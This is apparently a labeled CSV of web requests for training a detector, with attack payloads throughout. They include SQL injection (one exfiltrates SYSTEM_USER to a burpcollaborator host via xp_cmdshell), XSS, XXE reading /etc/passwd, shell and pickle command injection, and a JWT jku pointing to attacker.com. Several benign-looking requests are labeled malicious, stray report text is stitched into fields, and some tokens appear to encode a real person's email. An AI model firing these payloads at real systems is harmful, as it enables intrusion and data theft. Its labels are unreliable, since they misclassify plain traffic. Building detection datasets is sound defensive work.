method,path,query,headers,body,ua,label
GET,/,/__proto__[v-if]=_c.constructor('alert(1)')(),"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,0
POST,/,,,{smart_f_shell_exec('id')},,1
GET,/admin/users,limit=20&offset=40,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
POST,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*","{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,1
GET,/,,,,,0
GET,"prompt.call(null,1)",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,"prompt.call(null,1)",,,,,1
GET,select from,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,php://filter/convert.base64-encode/resource=index.php,,,,1
GET,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,,,1
,/robots.txt,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,0
GET,/assets/script-tag-2befZuvx.js,file=../../../../etc/passwd,,HTTP/1.1,,1
,/favicon.ico,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,0
GET,/,<svg/onload=alert(=RND=)//,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,|| ls -la,,,,,1
GET,/,,,,,0
,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/js/components/AlertDialog.js,,,HTTP/1.1,,0
POST,/,,,"{""alg"":""none""}",,1
GET,../../../../etc/passwd%00,,,,,1
GET,id=1' OR '1'='1,,,,,1
GET,/,token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzIxODE2MDMsImlhdCI6MTc3MTkyMjQwMywidXNlciI6eyJncm91cF9pZCI6IjAxOWMwZTZlLWI0YTctNzRjYS05MGNlLTUyY2M0Njg5MzZjZSIsImxlYWRlcl9pZCI6IjAxOWMwOWU0LTNmY2QtNzc2ZS05ZGUwLWFiZGYyZjI3ZTYwMyIsInNlc3Npb25faWQiOiIwMTljOGVjZS0zMTkyLTc4MjQtYTI1OS0zZDZmM2JhM2NkM,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><xs:schema xm lns:xs=""http://www.w3.org/2001/XMLSchema""><xs:include namespace=""htt p://xxe-xsinclude-namespace.yourdomain[.]com/""/></xs:schema>",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
POST,/,,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,1
GET,/static/js/select.min.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,?selectPromotionId=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E&sku=211003696,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/uploads/628668cae9db4d51b4edf55214b73fca-Facebook Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=%3Cscript%3E%3C/script%3E,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,cos\nsystem\n(S'id'\ntR.,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,"""onwheel=ead(111)","User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
,/favicon.ico,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,0
GET,/,,,,,0
GET,|| ls -la,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/alert.min.js,,,HTTP/1.1,,0
,/favicon.ico,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,0
GET,cat /etc/passwd,,,,,1
GET,/,,,,,0
POST,/,,,{{7*7}}{{ '7'*7 }},,1
GET,/products,category=electronics&brand=apple,,,,0
,/api/health,,,,,0
POST,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*","{""alg"":""none""}",,1
GET,/,,,,,0
,/,,,,,0
GET,/,,,,,0
GET,<body onload=alert('test1')>,,,,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,,,1
GET,/static/js/select.min.js,,,HTTP/1.1,,0
GET,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(1 5)))v)+'%22+(select(0)from(select(sleep(15)))v)+%22*/,,,,,1
GET,/,,,,,0
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""expect://i d"">]><foo>&xxe;</foo>",,,,,1
GET,`curl -L http://ⒼⓄⓄⒼⓁⒺ.ⒸⓄⓂ`,,,,,1
GET,cat /etc/passwd,,,,,1
GET,/,,,,,0
GET,id=1' OR '1'='1,,,,,1
GET,/assets/octagon-alert-7zrgUous.css,,,HTTP/1.1,,0
,/robots.txt,,,,,0
POST,/,,,"{""$gt"": """"}",,1
GET,/static/js/select.min.js,,,HTTP/1.1,,0
POST,/,,,"{""$gt"": """"}",,1
GET,/assets/octagon-alert-7zrgUous.js,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/,/&lt;svg/onload&equals;alert(1)&gt;,,,,1
GET,/assets/script-tag-2befZuvx.js,,,HTTP/1.1,,0
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM ""netdoc:/et c/passwd"">]><foo>&data;</foo>",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/Rnj7kZj.jpeg?q=%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx 109. Attack_PDF_1: 210 malicious requests have bypassed the security solution Payload Test case Encoder Placeholder Status RCPT TO: test@evil.com,,,,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,1
GET,/,,,,,0
GET,/,/assets/octagon-alert-7zrgUous.js?q=%3Cscript%3E%3C/script%3E,,,,1
GET,/js/components/AlertDialog.js,,,HTTP/1.1,,0
GET,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><x xmlns:xsi =""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""htt p://xxe-xsi-schemalocation.yourdomain[.]com/""/>",,,,,1
GET,/blog/post/how-to-use-union-select-in-sql,,,HTTP/1.1,,0
GET,'-alert(1)//,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
POST,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*","{""$where"": ""function() { return this.name == 'admin' }""}",,1
POST,/,,,"{""$gt"": """"}",,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/octagon-alert-7zrgUous.js,,,HTTP/1.1,,0
GET,/downloads/guide-v2.pdf,,,,,0
GET,union select,,,,,1
GET,Categories of Normal Traffic (50 Categories),,,,,0
GET,/,,,,,0
GET,%0d%0aBcc: victim@example.com,,,,,1
GET,"<!DOCTYPE x [ <!ENTITY % y SYSTEM ""//y/y"" > %y; ]><x>a</x>",,,,,1
POST,/webhooks/github,,,(Push Event),,0
GET,;getent$IFS$9hosts$IFS$9somehost.burpcollaborator.net;echo$IFS$9$((3 482*7301));,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/assets/octagon-alert-7zrgUous.js,q=%27or%201=1;--,,HTTP/1.1,,1
GET,/products/compare,base=p1&target=p2,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,../../../../etc/passwd,,,,,1
POST,/user/password-update,,,"{""old"": ""pass1"", ""new"": ""pass2""}",,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/assets/octagon-alert-7zrgUous.js,q=%3Cscript%3E%3C/script%3E,,HTTP/1.1,,1
GET,/,?34ea04b04c=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E,,,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,"3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sy s.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpco l'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXE C sp_SYS_ProtoOp @id=3",,,,,1
POST,/,,,"{""$where"": ""this.user == 'admin'""}",,1
GET,/id,token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzIzNTEwMzcsImlhdCI6MTc3MjA5MTgzNywidXNlciI6eyJzZXNzaW9uX2lkIjoiMDE5Yzk4ZTctOGFjMi03Mjc0LWFkM2EtMmRiNzFhZTYzZThlIiwic291cmNlIjoiQk8iLCJzdGFmZl9jb2RlIjoibGluaGxoMiIsInVzZXJfZW1haWwiOiJsaW5obGgyQHZucGF5LnZuIiwidXNlcl9mdWxsX25hbWUiOiJMaW5oIEzDqiBIw,,,,0
DELETE,75oBC$,,,,,0
GET,phar://path/to/malicious.phar/shell.php,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,/assets/octagon-alert-7zrgUous.js?q=%3Cscript%3E%3C/script%3E,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,User-Agent: ' OR SLEEP(5) OR ',,,,,1
,/index.html,,,,,0
,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,0
GET,id=1; DROP TABLE users--,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,/__proto__[v-if]=_c.constructor('alert(1)')(),,,,1
GET,/,,,,,0
GET,/tutorial/xss-prevention-script-tags,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,/api/workspaces/insky/projects/bce0a79c-90d2-4558-9084-945ad6acbdae/issues/,group_by=state_id&order_by=-created_at&sub_issue=true&filters=%7B%22created_by_id__in%22:%22d5bfcc01-0096-4c85-a741-3309c3099472%22%7D&layout=kanban&cursor=30:0:0&per_page=30&xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=setInterval(%27fet%27+%27ch(document.domain)%27),,,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
POST,/,,,"{""$gt"": """"}",,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/,/inskyXss?db=monasca&q=SELECT%20mean(%22value%22)%20FROM%20%22mem.used_perc%22%20WHERE%20%22resource_id%22%20%3D~%20%2F%5Ebfb959fd-8128-4a68-98c7-d062ebd2dc4b%2F%20AND%20time%20%3E%3D%20now()%20-%206h%20and%20time%20%3C%3D%20now()%20GROUP%20BY%20time(1m)%2C%20resource_id&epoch=ms,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,,,,0
GET,"""></textarea><ScRiPt>prompt(1)</ScRiPt// ""><iframe/onload=alert(1)// ”/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt”/>",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
,/api/health,,,,,0
GET,/,,,,,0
GET,/,,,,,0
,/favicon.ico,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,0
GET,/,,,,,0
GET,/,__proto__[v-if]=_c.constructor('alert(1)')(),"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,?selectPromotionId=986205&sku=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
,/robots.txt,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
,/favicon.ico,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,id=1'; WAITFOR DELAY '0:0:5'--,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,,,,0
GET,id=1' OR '1'='1,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,?34ea04b04c=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E,,,,1
GET,/,__proto__[v-if]=_c.constructor('alert(1)')(),"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,cat /etc/passwd,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,,,,0
GET,1e1 union select users from password,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,dc1e09adea=%3Cimg%20src=x%20onerror=alert%28document.domain%29%3E%2Fall,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,,,,0
GET,V100 CAPABILITY V101 FETCH 4791,,,,,1
GET,/,&lt;svg/onload&equals;alert(1)&gt;,,,,1
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
,/favicon.ico,,,,,0
GET,//////////////////etc/passwd,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
,/favicon.ico,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,0
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM ""netdoc:/et c/passwd"">]><foo>&data;</foo>",,,,,1
GET,/,,,,,0
GET,/assets/octagon-alert-7zrgUous.js,q=%3Cscript%3E%3C/script%3E,,HTTP/1.1,,1
,/index.html,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,0
GET,/,,,,,0
POST,/,,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,1
GET,/,/uploads/628668cae9db4d51b4edf55214b73fca-Facebook%20Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=union%20was%20a%20great%20select,,,,0
GET,/,,,,,0
GET,/,,,,,0
,/api/health,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,0
GET,dict://localhost:11211/stat,,,,,1
GET,/assets/octagon-alert-7zrgUous.js,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/static/img/../../etc/passwd,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
